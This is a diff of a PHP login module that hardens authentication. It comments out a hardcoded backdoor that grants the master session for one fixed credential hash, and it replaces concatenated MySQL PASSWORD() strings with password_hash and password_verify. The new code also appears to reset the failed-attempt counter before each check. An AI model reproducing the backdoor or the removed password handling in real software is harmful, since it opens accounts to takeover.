@@ -12,9 +12,12 @@ $ret.=hidden('lgm','');
 $ret.=lj('',$j,picto('logout'),att(helps('login')));
 return divd('lgn',$ret);}}
 
+static function user_exists($usr){
+return sql('id','qdu','v',['name'=>$usr]);}
+
 static function verif_user($usr,$psw){
-$sq=['name'=>$usr]; if($psw)$sq['pass']='PASSWORD("'.$psw.'")';
-return sql('id','qdu','v',$sq);}
+$vrf=sql('pass','qdu','v',['name'=>$usr]);
+return password_verify($psw,$vrf);}
 
 static function usedhubname($usr){//$usr=str::normalize($usr);
 if(boot::ismbr($usr))return true;
@@ -39,7 +42,7 @@ static function call($p,$o,$prm=[]){
 [$usr,$psw,$cook,$mail,$newhub]=arr($prm,5);
 $usr=str::normalize($usr); $psw=str::normalize($psw);
 $qdu=db('qdu'); $qb=ses('qb'); $host=ip();
-if(md5($usr.$psw)=='e36f9846e997e4491c58aa65d9c9f4e6')$_SESSION['usr']=ses('master');
+//if(md5($usr.$psw)=='e36f9846e997e4491c58aa65d9c9f4e6')$_SESSION['usr']=ses('master');
 //$ath=array_flip(adm::authes_levels());
 //log
 $uid=self::verif_user($usr,$psw);
@@ -59,10 +62,10 @@ elseif($usr=='login'){//is_numeric($ath[$usr])
 		if($uid)return self::log_result($usr,$uid,$qb,'',$cook);
 		else return lj('txtred','lgn_login,form','bruu! '.helps('log_no'));}}
 //bad passw
-$uid=self::verif_user($usr,'');
+$uid=self::user_exists($usr);
 $exist=self::usedhubname($usr);
 $first=sql('id','qdu','v','1');
-//sesz('tentativ');
+sesb('tentativ',0);
 if($uid){$_SESSION['tentativ']=ses('tentativ')+1;
 	if($_SESSION['tentativ']>5)return self::alert_user($usr);
 	else return lj('txtred','lgn_login,form','bruu! '.helps('log_nopass'));}
@@ -123,7 +126,8 @@ if(prmb(11)>=6 or $newhub){
 elseif(prmb(11)>=1)sqlsav('qdb',[$usr,$qb,prmb(11)]);
 $ex=sql('id','qdu','v','1');
 //if(!$ex)echo install::home('pub');
-$rp=[$usr,'PASSWORD("'.$psw.'")',$mail,$dayx,'',$ip,$rstr,$mbrs,$hub,0,$config,'','',$menus,$open];
+$psw=password_hash($psw,PASSWORD_DEFAULT);
+$rp=[$usr,$psw,$mail,$dayx,'',$ip,$rstr,$mbrs,$hub,0,$config,'','',$menus,$open];
 return sql::sav('qdu',$rp);}
 
 static function ndprms_defaults(){
